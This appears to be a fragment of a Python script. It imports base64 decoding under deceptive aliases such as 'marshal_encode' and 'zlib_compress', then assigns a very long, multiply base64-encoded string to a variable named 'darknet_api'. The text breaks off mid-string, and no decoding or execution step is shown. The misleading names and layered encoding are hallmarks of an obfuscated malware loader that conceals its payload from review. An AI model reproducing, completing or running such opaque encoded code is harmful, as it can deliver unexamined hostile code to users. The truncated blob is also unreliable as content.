from base64 import b64decode as marshal_encode;from base64 import b64decode as zlib_compress;from base64 import b64decode as obfuscate_import;darknet_api = "VjFaYWFtVkhVWGxUV0hCVVlXdEtTMVV3Vm5kak1XdDRZVVprYVZJd01UWldWelYzVWtkS1YyTkVWbHBoYTJ3elYycEdjMlJXVWxWUmEzQlRUVzVuZDFkVVFtcE9WMVpZVld0U1VtRXdOV2hXYWtKYVpVWndSbHBJVG1sV01VcFpXbFZhVTJGVk1IaFhhazVTVFdwR2VscEZaRTlUUlRsWllrZDBVazFGYkROWFZsWnZVekpLUjJKR2FGWmlhMHB3V1d4a1QyVnNUbFpaZWxac1lUTm9SVlZYTlhkaVJtUkdUVmh3VkZaWGFGUlpNR1JMVjBaYVdWUnJjRlJTV0VKMlYxY3dlRlV5VW5SVGJGSnJUVzFTY1Zsc1dsZFVSa1Y1VFVSV2JHRXphREZXUjNCWFlXc3dlRk51VGxwaVJUVjFXVlphY21WWFZraGxSbkJZVWxkNGQxVjZSa2RrTWtaWFlrWm9UMWRHV21oV01GWnpZbXhXUjFSclNtaFdWM2gzVlRGV01GZFdUa2hhUkZKWVZqTm9ObHBFUVRWT2JGSlpXa1pDYkdKRldUSlhWM2hQVVd4dmQySkZVbEpXTWxKTFZWUkNSMkpzVGxaVWEwcGhUVWQ0UlZWV1pHdFRiRVYzVW0wMVZGWlZOVU5YYWtKelVrWkdXRnBGY0ZKTlJWcDFWVEZXVDFGc2IzZGlSVkpTVmpKU1MxVlVRa2RpYkU1V1ZHdEtZVTFIZUVWVlZtUnJVMnhGZDFKdE5WUldWbTh3Vkd0VmVGZEdUblJUYXpWVFpXdEtkVlV4Vmtka01XdDVWbXRXVTJKWGVGbGFWM1JHVFRGU1dXTkZTazlOUkZaR1ZrYzFVMU5zU25WYWVrSlZWbTFTVEZkWGMzaFdWMDE2WTBVMWFHSnJNVE5XUmxacVpERnZkMkpGVWxKV01sSkxWVlJDUjJKc1RsWlVhMHBoVFZkb1NsZHFUbTlYYlVwSlZHcFNWVTB6UWs5YVZsVTFUbXhXV1dGSGJGZGlhelYxVm14V1QxRXhUbFppUlZwVlZqSlNUbFpVUWt0VU1VNVdWbXRhWVUxVk5ERlZWM1IzVTJ4S1ZtSkhOVmRUUjNoRVZteFdjMUl5VmtWVmF6VlhUVWhDY0ZaR1dsTmxiVlp5VFZoR2FtVnJTazlWYm5CRFlteE9WbFJyU21GTlIzaEZWVlprYTFOc1JYZFRiWEJoVmxaS1NGbFdXbXRPYkVaVldrVTFiR0V3VlhwV1IzUlRWREpTUm1KRlNtcFNNRFZ6Vld0V1lXTkdXWHBqUlVwUFRVUkZNbFZXVW10VU1VcEdUbFJDVkZaV2J6QlVhMVY0VjBaT2RGTnJOVk5sYTBwMVZURldUMUZzYjNkaVJXUnNVa1pLVDFacVFuZGhWbEpXVlc1d2JHRjZSbmhaTTNCRFZHeEtObEp0YkZaaVIyaDJXa1JLVDJSR1duVmpSM0JzVmtWYVJsZFVTVEZqTWxGNVZXdG9VRkl5VWxkVVYzTXhUbFpzVjJGRlRrNVNWM2hJVmpJeE5HRnRTbkpPV0dSYVlXdHJkMWRxUVhoalZrNTBWV3hzVkZJeVVUQldNV1EwWlcxUmVWTnNVbEpXTWxKTFZWUkNTMkZzY0ZaVmEyUm9WbTFSTWxWV1VtdFViVlp5VWxST1ZXRXhTbEJhUlZaelVXMU9TRlJ0ZUZOU1ZuQjNWbXBPZDFGck5IZE5WRnBTVmtkU1VGVnJWVEZOUms1V1YycFNUMUpVUmxsVk1qRkxWRzFXZFZScVdsVldiRW8yVkZWVmVGTkZNVWhhUlhCU1RVVmFkVlV4Vms5UmJHOTNZa1ZrVm1KVWJHOVdNRlY0WW14c05sTnJPV3hXTUZwYVZWZHdRMU5zU1hsbFJGcFVWbGROZUZwSE1WTlNSa1owVFZkc1RrMUhlSFZYV0hCTFVqSk5lR05HVWxOV01sSkxWVlJDUjJKc1RsWlVhMHBoVFZkb1NsZHFUbTlYYlVwSlZHcE9WVTB6UWs5YVJFRTFUbXhXV1dOSGJGWk5SVnBOVmpCV2IySnRWa2RpU0U1cVRUSlNVVnBYYzNoTk1WRjZZMFpLYkdKVmNGVlZWekZQWWtaS1JsZHVRbGROTTBKRVdrVldjMUpHUmxoYVJYQlNUVVZhZFZVeFZrOVJiRzkzWWtWa2JGSkdTazlXYWtKM1lWWlNWbFZ1Y0d4aGVrWjRXVE53UTFRd01YRlJiVFZVVmxaV05GbFZXblpsVjFKSVlVZG9XRkpVVm5aVk1WWnFUVmRLYzJKR2JHbFRSbkJ3V1d4a1QySnNWbk5XYXpsV1lUSjRSVlZYTVU5aVJrcEdWMjVDVjAwelFrUmFSVlp6VWtaR1dGcEZjRkpOUlZwMVZURldUMUZzYjNoaFJXeGhUVEpvWVZscmFFOU5NVkY2WTBVMWEwMUVhekpXVm1oM1lWWlZkMUpyZUZoU1YyaDFXbFZhYzJNeVRYcGFSa0pzWVhwRmVsWkVUbmRWYlZaMFUyeFNVbFl5VWt0VlZFSkhZbXhPVmxSclNtRk5SM2hGVlZaa2ExTnNSWGRTYlRWVVZsVTFRMWRxUW5OU1JrWllXa1Z3VWsxRlduVlZNVlpQVVd4dmQySkZVbEpXTWxKTFZWUkNSMkpzVGxaVWEwcGhUVWQ0UlZWV1pHdFRiRVYzVW0wMVZGWlZOVU5YYWtKelVqSldSVlZyTlZkTlNFSndWa1pXYW1ReGIzZFVia0pVVmpKNFMxZHFUa05rUm14eFZHdHdZVTFYZERWWlZXUnZZVzFHVmxOdVpGcGlWM2hFV1ZaYWMxZEZOVmxXYlVaWVVsZHplVlZVU210ak1sWjBWbXhzVlZkR1duRlVWRVpMWTJ4c2NWUnNaRTVTV0dneFYydG9jMkZHWkVkVGJrNVVUVWRTVUZscVJuTlhWazVaVVd0U1lVMXVaekpYYkZwdlZHMVNXRlJZY0ZaaVdGSndWRlJHV21ReFVraE5WMFpxVFd4S1dsWkhNRFZVUmtWNVpFVjRVazFYYUZSWk1HUkxWMFphV1ZadGNFNWliV2g2VmpKNGIxRnRTWGROVlZKUFUwZFNUMVpVU2pCVVJuQkhZVVU1YVZJd05YcFVNV2hEV1ZaRmQxSlVWbFJXVjFKNldrWmtUMU5XV25GUmEzaFNUVWhDY1Zkc1ZsTlNNa1pYV2tSYVVsWkhVazlhVnpGT1RURlNjbFZyZEd0U1YzaEhWbTF3VTJGc1RrWmpTRTVhWldzMVVGVnJaRTlrVjBwSldrZDBVMlZ0YUhWV1ZFWlhWV3h2ZUdGRmJHRk5NbWhoV1d0b1QwMHhiSE5VYTBwUFlUSjRSVlV4YUVOU1IwcDBWVzA1V2sxcVFYaFpNR1JMWkVacmVWcEdSbFpOUlZwM1ZURmtjMU5zVFhoV2JsSlhZbGhDY0ZSWGNFZE5SbVJ6V1hwR2FFMVlRbGxXVm1SclZHeFdObEZxV2xSV1YxSjJXa2N4VTFkV1RuVmpSWEJUWW0xamQxWkdXbXRUTVd4eVRWWldhazB6UWs5WlZ6Vk9aREZTVjFremFGcGlSVm93VlcwMVYxTnNTWGxsUkZwVVZsZFNTRmxYTVZOVFIwcEZVMjFHVmsxR2NISldNRlp2WW0xV1IySklUbXBOTWxKd1ZsWm9RMU14VGxaWGFsSlBVbFJHV1ZVeU1VdFViRnBKVkdwYVZWWXpRalpVVlZWNFYwVXhXV0pIUmxkbGExbDVWMnRqZUZZeGEzbFdhMVpUWWxkNFdWcFhkRXROUms1V1lVWk9hVTFZUWxWVlYzQkRZVVphTmxKdVRscE5iWGhFV2xjeFMwNVdSbkZSYldoVFRVWnNNMVV4Vm05ak1sSjBWV3hTVW1KWVFtRldibkJUWW14c2MxcEZaR3RXYlhoWlYydGtORk5zVGtobFJFcGhVbTFvUzFkcVNrcGxiSEJKVm10d1ZGSnJjRE5YVjNoclZtMUdSbFJ1VGxaaVZHeG9WbFJDUzJSR2JIRlVhM1JPVWpGS1dWUnNaRFJUYkVvMllraFNWRlpYYUhwYVJ6RlRWMVpPV0ZwR2NGZE5SRlo0VjFkd1QxWXlVbGhWYTFKclRXMVNiMVl3VlhoaWJHeHhVMVJDWVUxc1dsbFVNVkpIWVcxR1ZsTnRjR0ZXVmtwSVdWWmFhMDVzU2xWYVJUVnNZVEp6ZWxaSGRGTlNNbEpJVW10b1UySnNXbWhWYlRWdVRVWlNWMXBGZEZwaGVrWkpWRlZvVjFOc1JqWlZiVFZWVWpKNFExVjZRVFZqYkZaV1pFVndhRlpYZUhkVlZFbDRXVmRTZEZSdVFsSmlXRUp2VldwQ1lVNVdUbFphU0U1clZsZDRTbGRyWkc5aGJVcFZWbTVrV21KVVJuRlViWFJQWW0xS1NXTkhlRmhTVkVWNFYxaHdUMVV5UlhsVFdIQlhZV3RLVGxsdE1WTk9WbXhYWVVaT2FWSllVa2xXUnpBMVYyeGtSbUpJWkZKTmJWSjZXbGN4VjFkV1VsbFdiWEJPVFZWd2VWZFhjRTlXTURGR1pVaFNXR0pyTlhKV01GVXhaR3hOZDFSdVNsUk5SVFZhVmxjMVEyRldXWGhXYWtaYVpXdHZNRmxyV25kWFZrWllUMVUxVW1Wc1NYcFdSbHBQWTJ4TmVWUnJiRlJpYTBwd1dXMTRSMlJzVGxobFJGSnJWbXhXTmxaWE1XOWhiVXB6VW0wMVZsWkZiekJaVldSSFYwVXhXVkZ0YkdsV01EUjNWVEZXVG1ReGIzZGxSbEpTVjBaS1MxVlljRU5pYkZKSFZHdEthMUpYZUVWVVZXUnJWRlpWZDJKSVpGSk5iVkl6V1ZSR2QxZEdaRmhhUjBaT1lrWnNNMVl3VWs5V01rWkdaRVZTYUdWc2NFVlhha296WlVac05sTnNaR3hXYldRMVZXMHdNVmxXV2paV1dHUllVa1Z2TUZrd1pFNWxiRlpZV2taR1ZrMUZjSEJWTW5CQ1pVZFNkRlp1VW1sVFJUVndWV3BDVjAxc1VuTlVWRUpyVFVkNFJWbFZXbTloUmxvMlZtNUtXbUZyTlhKYVYzUnpVbXMxVjFacmNGTlNWbGw2VmtWa2QxRnJOSGRpUldSaFUwVktjRmxYZUhKa01WRjZZa1ZPVDFKVVZuaFdWbWhEVTJ4S1ZsZHFUbHBOUjFFd1dXdGFXbVZXV25SaVJsSk9ZbGhrTTFaRmFIZFdiVlp5VGxSV1QxTklRbEJaVmxaSFpHeFdObEZ0T1ZkV2JFcFhXa1JPVDFOc1NYcGhTR1JhVmtWd1YxZHFSa3BsVmxwMFkwZG9UbUZ0YUROVk1WWlhWREpKZVZSdVVsQlhSa3BvVmxod2JtVldVbFpVVkVKclRVaG9lRlpHYUc5VWJGcEdZa1JHVlZac1NrZGFWM1J6VWpGU2RHRkhSbWxXVm04eFYxWmFUazVGTVZaTlZGcGFUVEZhVDFwWGVITmtWbEpHVkcxMFZXSlZiRFpaTUdoRFlWWkplbUZIT1ZWVFNFSlhXa1pWZUZKR1JsaFBWbVJPWWxobmVGWXlkR3BPVlRCNVZHcFdVbUY2YkZoVlZFSkdaVlpTU0dORldrOU5SM2hJVjJ0b1EyRlhSbk5oTTJSVlRUSjRSRlJyVlRGalZsWlpVV3R3VTFaV2IzcFhWRUpyVGtkS1IxZFliRmRpVjNoVlZGY3hNMlF4VWtsalJscHNZWHBWTVZScmFIZFVNa1pXVW01YVZtVnJTblpXYkZwVFZtMVJlbFJyY0ZOTk1tZ3pWMVpTUzFac2IzaFRXR3hYWWxoQ2IxUlhjRzlrTVU1V1ZtczVhVTFyTlRCVU1XaFRXVlpXTmxvemJGVldWVEIzV2tSQ05HTldVbGxoUlRWWFVsZDNlRlpFUmxOUmJHOTRWbGhzVTJKVVJtRldNRlozWkRGU1NXTkdXbXhoZWxVeFZHdG9kMVF5UmxoVWJuQlVZV3RHTkZwSE1WZGtSMHBKVkcxc1UwMUdXWGxXUjNoT1RVZFJkMkpGVW1oU2JXaHZWbTV3VjJOc2JIRlViWFJzWVRKNFIxUnNXbGRUYkVwSFZtcEdWVlpzU2paWGFrWmFaVmRLU1Zack9XaGlSVlY2VlRGV2IySnJNWEpPVlZKb1RXMVNVMVl3Vmt0Tk1XeHlXa1prV0ZKdVFsbFZNblEwWVVaa1IxSnFTbFZpUmtwUFZGUkNOR05XVWxWVGEzQlNUVzFvVGxaVVFtRlZNVkp6Vld0U2EwMXRVbkJWYWtvMFpWWmtjMVJyVGxSU2JrSlpWa2MxUzJGWFZsaGtSelZXVmtWd2RscFdaRXBsVlRGWVpVVXhiR0pIZDNwV1JXUjNVVzFTVmsxVVdsTlhSMmhQV1ZaU1VrMVdVbFpVYTA1WFVtMTRXVll5TVc5aGJVcFlaRVJLVldKR1NrOVVWRUkwWTFaU1ZWTnJkR3hYUjFJeFZtdGFhazVWTlhSU2JHaHNVMFUxWVZaWWNHNWxSbEpJWTBWS1lVMUlVa2hYYTJoRFlWZEtWMU5xU21GU1JUVlBWMnBHVTJNeFZsaGFSVGxvVmtaSk1WWkVUbk5STVdSSVVteG9UMUpGY0ZCVmEyaFBZbXh3VmxWc2NFNVNXRkpWVlZkMFMyRnNUa1pUYm5CWVlrWndjbGxyV25OamJWSkpVVzEwVW1WdFpEUldSbWgzWVcxU1ZrMVVXbGhXTWxKTlZXeG9VMU5zV25KV1dHaFZWbGhvUlZWWE5VOWhSbGw2Vlc1T1ZGWldXbkpaYTFweVpWZFNTVmRyZUZaTlJYQkdWMVpXYjFNeVVuUlRiR2hYVjBad1VGbFhkRWROVmxKV1ZGUkNiR0Y2UmxaVmJHaHpWRmRHZEdSRVRsUldWbkJRV1ZWYWQyUkdTblZpUjJoV1pXMWtORlpHYUhkaGJWSldUVlJhV0ZaNlZrNVZWRXBUVkRGc2NWUnVaR3BTTUhCSldsVmtiMVJYVm5OV2FrWlZWbFUxUTFscVJtdFNWa3BaWVVaQ2JGWlZjRTlYVmxwcVRWVXhXRlpyVWxKaGJFcFJWV3RhZDJKV1VuUmpSa3BxVWxkNFIxVnROV3RoYkVsNllVaE9WMkZyY0ZoWlZscE9aVmRLUlZGck1XeGlSbGt5VmtjMWNrMUhWbkpPV0VKU1ZucHNWVlJWWkc5V2JGcEhWbXBPYWsxSGVFbGFWV2hEWVVVeGMxWnROVlpoYTNCWVdWY3hSbVZWT1VsUmEzQlRWbFJXTWxkVVNYZE9WMUpIWTBaU1VGSkZTbEJWV0hCVFRURlNTR05GY0U1U1ZFWkdWa1pvVjFSc1drZFdXSEJVVmxad1VGbFZXbmRrUmtwMVlrZG9WbVZ0WkRSV1JtaDNZVzFTVmsxVVdsaFdlbFpPVlZSS1UxUXhiSEZVYm1ScVVqQndTVnBWWkc5VVYxWnpWbXBHVlZaVk5VTlpha1phWlZkS1NWWnRSbE5sYlhRMlYxUk9jMUV4VVhoWGExSlNWa1Z3VGxsWGMzZE5NVTVXVjIxMGFsSXdjSGhXTVZKRFZVZFdWbE5VUWxWaVdFSlRXVEJXYzFKc1NuVmFSM0JUVFRKb2VsWnRjRXRXTWtaWFZGaHNhVkpGU2s1YVYzaFhUbXhTZFdGNlFteGhlbFozVlZaak5WWkZNVWhoUmxwWFVteFplbGw2UW5OVFIxWkpVVzFvVG1KR1duVldWM0JMVmpKR2RGSlliRkJUUlVwTFZXeFZNV1JzYTNsTlJGWnJVbTVDVlZRd1VrdFViRVkyVldwT1ZWSXpRazlhVlZWNFZsWk9XVlpyTlZkU1Zsa3lWVEZXWVZReVJrZGpTRkpUWW0xNGIxWlljRzVsUmxKWlkwZHdhMVpVUlRKV01XTXhWRlpGZVZWck9WcGhhelV6V1RCa1MxTkhWa2hoUlRGc1lrWlplRlpHVms5UmJVbDRWMWhzYVZOR1dtaFZibkJ5Wld4cmVtSkZUbFZOVm5CRlZWWm9iMVJzUmpaVmFrNVZUVEo0UkZZd1pFZFhSVFZGVTJzNVUxTkZOWFZYYkZaVFYyc3hSbVJHVWxKaE1IQnhWVEJXUzJWc1pITlhiWFJwVW0xNGVWcEZhRU5oTVVZMldqTm9WVmRJUW5GYVJsVjRUbXhrV0ZwRmVGTlhSa3BMVm0xMFZtVkdVbFpsUlZKU1ltczFiMVpxVGxOak1VNVdWbTEwYVZKdGREVmFSV2hoVkVaVmQxTnJWbHBXVjJoTVdrY3hTMWRHV2xsWGF6bFhVakEwZUZaR1ZrNU5SMVpXVDFaV1lXVnJOVTVaVjNSWFRteFNXV0pGVGxkU2JYaFpWakl4YjJGdFNsaGtSRXBWWWtaS1QxUlVRalJqVmxKVlUydDBiRmRIVWpGV2ExcHFUbFUxZEZKc2FHeFRSVFZoVmxod2JtVkdVa2hqUlVwaFRVaFNTRmRyYUVOaFYwcFhVMnBLWVZKRk5VOVhha1pUWXpGV1dGcEZPV2hXUmtrd1ZrUk9jMUV4WkVoU2JHaFBVa1Z3VUZWcmFFOWliSEJXVld4d1RsSllVbFZWVjNSTFlXeE9SbE51Y0ZoaVJuQnlXV3RhYzJOdFVrbFJiWFJTWlcxa05GWkdhSGRoYlZKV1RWUmFXRll5VWsxVmJHaFRVMnhhY2xaWWFGVldXR2hGVlZjMVQyRkdXWHBWYms1VVZsWmFjbGxyV25KbFYxSkpWMnQ0VmsxRmNFWlhWbFp2VXpKU2RGTnNhRmRYUm5CUVZtdGtUMDFXVWxaVVZFSnNWbFJzVmxkdWNFOVVWMFp5Vm1wYVZWZEhlRVJXYTFwelYwWmtkR0ZIY0dsV00xRjVWa2Q0VTFSck1IZGxTRVpWVmtWd1RGcFdhR3RrVmxwSFdYcFdUMkpWV2xsYVZXaFBWMnhXTmxvemFGVlNNMEpEVjJwQ01GSXhjRWxSYld4cFZtdHZlVmRyVWs5VWJHOTRWVzVPVmxZeVVrOVdhMVpIVFZaU1ZsVnVjR0ZOVm13MVdXdG9WMVF5Um5OU1ZFNVVWbGRvZFZSWGN6RlNSMFY1V2taS1dGSlZiM3BYVjNSclZqRmtSMk5HYUZSaE0yaHZWakJhUjAxc1VuTlZhelZPVFVob2VGWkdVa3RUYkVWNVlVVXhWazFHY0ZSV1IzaFRVa2RSZVZwSGJGTk5ibWcxVmpKNFQxRXhUa2RqUm1oVlltdHdjRnBXWkRCaWJGWlZVMjA1YkZZd2JEVlVWbVEwVkZkV2MxWllhRlZTTTBKRFdrWlZlR05XY0RaVmF6VnNWa1pGZDFaSE5YTlJNVnBIWWtab1dHSlhhSEZaYkdRd1RXeFNjMVZyTlU1TlNHaDRWa1pTUzFNeVZsbGFTRlpYVW0xTk1WUnRNVWRYUjFaSlZHeHdWbVZ0WkRSV1JXUjNVV3h2ZDJSRlpHRlRSVXB3V1d4YVMwMXNjRVZVYXpWaFRWWktlbFpXWkd0VU1rWlZWV3BTVlUweWVFUldNR1JIVjBVMVJWTnJPVk5UUlRWMVYyeFdVMWRyTVVaa1JsSlNZVEJ3Y1ZVd1ZrdGxiR1J6VjIxMGFWSnRlSGxhUldoRFlURkdObG96YUZWWFNFSnhXa1pWZUU1c1pGaGFSWGhUVjBaS1MxWnRkRlpsUmxKV1pVVlNVbUpyTlc5V2FrNVRZekZPVmxadGRHbFNiWFExV2tWb1lWUkdWWGRUYTFaYVZsZG9URnBITVV0WFJscFpWMnM1VjFKc1dYaFdSbFpPVFVkV1ZrOVZWbUZOTTBKT1dWY3hhbVZzVGxaWGF6bG9VbTVDTUZWdE5YTmhSbFkyV2pOb1ZWZElRbkZhUmxWNFRteGtXRTVWTVZKTmJFcFFWMWR3VDJReVRraFRhMmhzVWpKb1RscFhlRWROVmxKV1ZHdEthVTFYZERWVU1XaFRZV3hKZDFkWVpGcFdiVkpNV1hwR2QxWlhUWGxhUmxaWFlYcFdURlpYZUU5UmF6VldaVWhHVWxaSFVrdFZiVEZUWkRGc2RFMVdUbXRpVmtZMlZrWmthMVpYU2tkU2JUVlZZbGR6ZDFwVlZqQldSbXQ2Vkd0MFRsSkZXWGxYYkdONFl6Sk5lVk5yYUZOWFJuQlFWbGh3VTAweFRsWlViVGxZVWpCYVdWUnNaREJoVlRCNVZXcGFWRlpXVlhoV2JGWnpVbFprV1Zack5WZFRSVFYxVm0xd1FrNVdaRVpPV0VaV1ZrZFNTMVZ0ZUV0T1ZteFhXa1pPYVZJd2NERldWbWhoVkRKV1ZWVnFUbFZOTW5oRVdsWmtVMk5YU1hwaFJUVldaV3hKZWxWNlJrOVJNazE1VW14b2ExSXphRXRWYkdSVFl6RmtWVk5xUW10aE0wRXhXa1JKTVZaV1dqWmhla3BhVm0xUk1GbDZSbk5XUlRsRlVtc3hhR0V3V25WVmVrSnJWREpTZEZOc2JGSmlWMmh5VldwS05HTkdiSEphUmxwUFRVZDRSMVJXV2xOV1JscFhWbTAxVlUxVk1IZGFSRUUxVGxaR2MyRkhhRmRsYkZwNVYxZHdUMkV5Vm5KaVJWcFBWbXhhUzFWclduTk5WbEpYVlc1d1lVMVdiRE5VTVZwdlZESkdjMUpVVGxSV1ZuQlVXbFprUjFkR1ZuUmxSMnhwWWtWWmVWWkhlRTVOUjFGM1pFWlNXazB3TlV4VVZWSkhUV3h3V0UxWVRtcE5hM0JKVld4b1lWUXhWalpWYWs1VVZsVTFkbFl3WkVkWFJUVllaRWRzVGsxc1NUSlZNVlpXVFZaYVZtSkZWbGhYUmxwUFZtdG9UMkpzV25KaFJYUnFVbTVDU1ZadE5WZGhNVVkyV2pOd1ZWSXpRa05VYWtKelUxWk9jVk5zUW1oaE1Wa3dWa1ZrZDFGdFRrWmlSV2hzVTBWS2IxUlhlRmRpYkZaeFUyeGthR0pWVmpWVU1HTXhWRlpGZVZWck9WcGhhelV6V1RCa1MxTkhWa2hoUlRGc1lrWlplRlpHVms5UmJVbDRWMWhzYVZOR1dtaFZibkJ5Wld4cmVtSkZUbFZOVm5CRlZWWlNTMVJYUm5KaGVrNVVWbFp3Y2xaVldtRk9iR1JWVVd4Q2JGWlZjRmRYVkVsNFl6SkZlR05HYUU5V1JVcE9XbGN4VDAxV1VsWlZibkJoVFdzMU1WWXhVbUZVYkZwR1ZtcEdWVlpWTlhsWGFrcExVMGRLU1ZOdFJsWk5SWEJLVmpKNGExUXlUblJUYWxaYVRUQTFURlJWVWtkTmJIQllUVmhPYWsxcmNFbFZiR2hoVkRGV05sVnFUbFJXVlRWMlZqQmtSMWRGTlZoa1IyeE9UV3hKTWxVeFZsWk5WbHBXWWtWV1UxZEhVazVaVjNSR1RURk9WbGR0ZEZaU2JHOHlWakZTUTFWSFZsWlRiRnBhVFdwR2VsbFVSbmRYUlRWVlVXc3hiR0pWTkhoV1JsWlRaV3h2ZVZSdVZsaFdSbkJQVm10V1YwMVdVbFpVYmtwaFRXdHdTVmxyYUV0WlZsVjNVMnRzV0dKSFVsQlpNakZMVGxacmVsUnJkRTVTUlZsNVYyeGplR015VFhsVGEyaFRWMFp3VUZaWWNGTk5NVTVXVkcwNWFHSlZiRFZVVm1oclYyeGtSMU51WkZoV2VrVXdXV3RWTlU1V1JuSk9WbHBPVWpOb1NGVXhWbE5qYlZKV1RWVldhazF0VWxoVVZ6RTBUVlprY2xsNlZrNU5helF4VlZkek5WWXhSWGRTV0d4VlVqTkNRMVJxUW5OU01WWjFZa2RvVjAxVmNIcFhWekF4VlcxU2NrNVdVazlUUjFKTlZsUktUMlZzVG5GUldHaHJZbFphTUZscmFFOWhWa2wzVm1wS1ZXSkZNSGRhUkVKelVrZEdSMkZIYUZkbGJGcDVWMWR3VDJFeVZuSmlSVnBQVm14YVMxVnJXbk5OVmxKWlkwaHdZVTFXYkROVU1WcHZWREpHYzFKVVRsUldWbkJVV2xaa1IxZEdWblJsUjJ4cFlrVlplVlpITlhKTlIxRjNUMVJXVW1KdGVISlpWekExVGtaU1YxUlVRbXROU0ZKVlZWYzFUMkZHV1hwVmJrNVVWbFphY2xsclduSmxWMUpKVjJ0MGJGZEhVakZXYTFwcVRsVTFkRkpzYUd4VFJUVmhWbGh3Ym1WR1VraGpSVXBoVFVoU1NWWkhOV0ZoVm1SR1UyMDVZVkpYVW5wWlZtUkxVMFphVlZwRmNGTldSVnBXVmxSR1YxWnNiM2RQVmxKUFUwZFNVVnBXVmt0WFZteFhXWHBHYUUxcmJEWlhhMmgzVTJ4S1ZWWnNXbFJXVmtwaFdrWlZlRlpYVFhsYVJtUlVVbGhDTTFZeWRHdFdNbEpZVld0U1VGSkZXazVaVjNSSFpERk9kV0pFVG1saVJrcFpWREZTWVdGR1dYcGhTSEJZVm1zd01GUldWalJqVmtaWVdrVjRVMkpXU2pOWFZ6QjRWVEpTZEZWWWNGVldNbEpXV1d0YVIySnNVblJoZWtKc1VsUnJNVlZYZUc5aFJsbzJWVmhzVldFeFNqWlhha3BYVWxaa1ZWRnNRbXhXVlhCWFYxUkplR015UlhoalJtaFBWa1ZLVGxwWE1VOU5WbEpXVlc1d1lVMXJOVEZXTVZKaFZHeGFSbFpxUmxWV1ZUVjVWMnBLUzFOSFNrbFRiVVpXVFVWd1NsWXllR3RVTWs1MFUycFdXazB3TlV4VVZWSkhUV3h3V0UxWVRtcE5hM0JKVld4b1lWUXhWalpWYWs1VVZsVTFkbGxYTVVwbFZURlpXa1p3V0ZKcmNETldNV040VGtkS1JrOVVWbEpoZWxaWFZGVmtORkl4VGxaVmExcHJUVWhvZUZWV1VtdFRiRXAwVlc1a1dtSlVSbFJhUnpGU1pXeFNXRnBHVm1sU2ExcDFWa2N4Y2sxSFZrWlBWRlpTWWtkb1ZsUldaRTVsVmxKeVZXNXdZVTFXY0VwVk1qVkRXVlpKZUZkcVJtRlNWVEF3VkZkME5HTldSbGxSYTNSc1YwZFNNVlpyV21wT1ZUVjBVbXhvYkZORk5XRldXSEJ1WlVaU1NHTkZTbUZOU0ZKSlZrYzFZV0ZXWkVaVGJUbGhVbGRTZWxsV1pFdFRSbHBWV2tWd1UxWkZXbFpXVkVaWFZteHZkMDFXVmxKWFJscFBWV3RvVDJKc1duRlRiazVyVm01Q1NWUXhVazloYlZaV1UyeENWMkV3TlVOVVYzUTBZMVpLVlZwRmNGTmlSVzh4VjFaYWExVXlTa2hUYmxaV1YwWndVRmxXVWxOTk1VMTRWRzF3YWsxSE9UTlVWbWhoWWtkS1dHVkljRnBoTWxKSFdrZHpNVkpGTlVsYVJYQlNUVzFvZUZkWGNFcGxSMUY0WWtac1ZtSnJTbUZaYkdodll6RlJlbUpGVGxWaVJsWXpXV3RXWVZOc1NraGFSRVpWVmxaS05sZHFSbHBsVjBwSlZtMUdVMlZ0ZERaWFZFNXpVVEZSZUZkclVsSldSVnBPV1ZkMFZrMHhUbFpYYkU1c1ZqQmFXVlpYTVRSaFYwcHpVbXBLVldFd01IZGFSRUUxVGxaR1dWWnNWbWhOVm5CWFZURldWMVF4VWxkV2JrSlNWMGQ0VGxsWGRFZE5WbEp6Vld0S1RrMUVSbmhYV0hCclUyeEdObFpzUWxaaVJuQlRWMnBHUm1ReVZrZFVhM0JUVWxSRmVGWkdWazVOUlRGR1RsWldVbFpGY0U1WlYzUnpUa1pTYzFWcmNFOU5SM2hGVkd4Vk5WVXhXbk5TYlRWV1ZrVkpNRlpVUW5OU1ZsSlpWbXM1Vm1Wc1NUSldSbFpUWVcxV1ZrOVdVbWhOYWxaYVZsWmpOVk14WkhSTlJGWnNWbGQ0U1ZsVVNtdGhSbG8yVlcwMVdrMXFSa2hhUmxwMlpWWmFXRTlWTlZaTk1rNDFWWHBHVTJSc1RYZFViRXBwVWtWYWNWUlhlR0ZPVm1SRlUydGthV0pJUWxsVWJGSkRVMnhLUlZGdE5WcE5ha1pJV2taYWQxTkZPVmxWYXpGcFZsUldNbGRYY0V0ak1rWnpZMFpTYUZKRlduRlVWM2hoVGxaa1JWTnJaR2xpU0VKWlZHeFNRMWRWTVhWaFNHUmFaV3MxVTFrd1ZrOWliVXBKWWtkR1dGSnJiRFJYVkVsM1RVWnZlVlZzYkZWaVdHaHhXV3RTYzJJeFpIRlRiR1JyVmpGS1ExbHFRakJaVmtsNFYyNVNWRlpYVW5KWmEyUlRVakE1VlZGdGJFNWliRXA2VjFjeGMySXlVWGhpUm1oaFVqTm9UbFZ1Y0hOTk1YQkdXa2hPYTJKVmNIZGFWV1IzWVZVeGRHVkVSbFJOVmtveVZYcENUMWRXUm5SaFIzUlVVbXR3ZWxkVVNYZE5WMVp5WWtWV1RsSXlVbGxhVmxaM1lXeE9XR0pGY0dGTlNGRXhWVmN4ZDJGVk1YUmxSRVpVVmxVMU5sZHFRbk5qTVZaMVYyMW9UbUpHYjNoV01GWlBVMjFOZDJKRlpHdE5iWGhaVkZkMFYwMUdjRmhrUlZwclVtMVNlRlZXYUZOVlJscHhVVzVzV0ZKVk5VdFpWbFkwVWtaT2RGUnJjR2hXVjNoMVZYcE9jMUV5Um5SVFdHeHBVMFphUzFWVVRrOWliRTVZVGxaT2EySlZWalZXYlRWWFlXc3hjMWR1Um1GU2JXaE1WMVJDYzJOSFVYbGFSbXhTVFVoQ2NGWXhXazVsUlRWelVteFNUbFl3V2s5VldIQkNUVlpXUjFkWVpHcGlSMmhGVlRGa2MxZFdWbGhQVlhSYVZtMVNZVmRxU2twbGJFWnhVVzFvVjJWdGQzaFZNVlpTWkRBNVZtSkZVbFJYUjFKTFdWY3dOVlJHUlhoU2JrNU9VakJzTlZwRlpEUmhWMFpXVWxSV1ZGWlhhRkJVVldSUFkwZEdTV0pIUmxabGJGb3dWMVphYWsxWFJYaGlSbWhzVTBVMVRWVXdWa3RpTVhCR1lVWk9hVkl3TlRCVWJHaDNWMGRXY2xOdGRGVlNWMmhFV1ZWYWRtVldXbGxSYTNoV1ZucHNURlZVUm10a01ERllVMjVTYTFOSVFrdFZhMUpEWW14WmVtSkZkRnBoTW5oM1drUktjMWRXVlhkaVNIQlVWak5uZWxsV1ZuTmpSMUY1WWtWMGJGWllRbkpWVkVwclkyeE9jMk5JVWxCWFIzaExWV3BPUW1WR2JIUk5XSEJoVFd0Y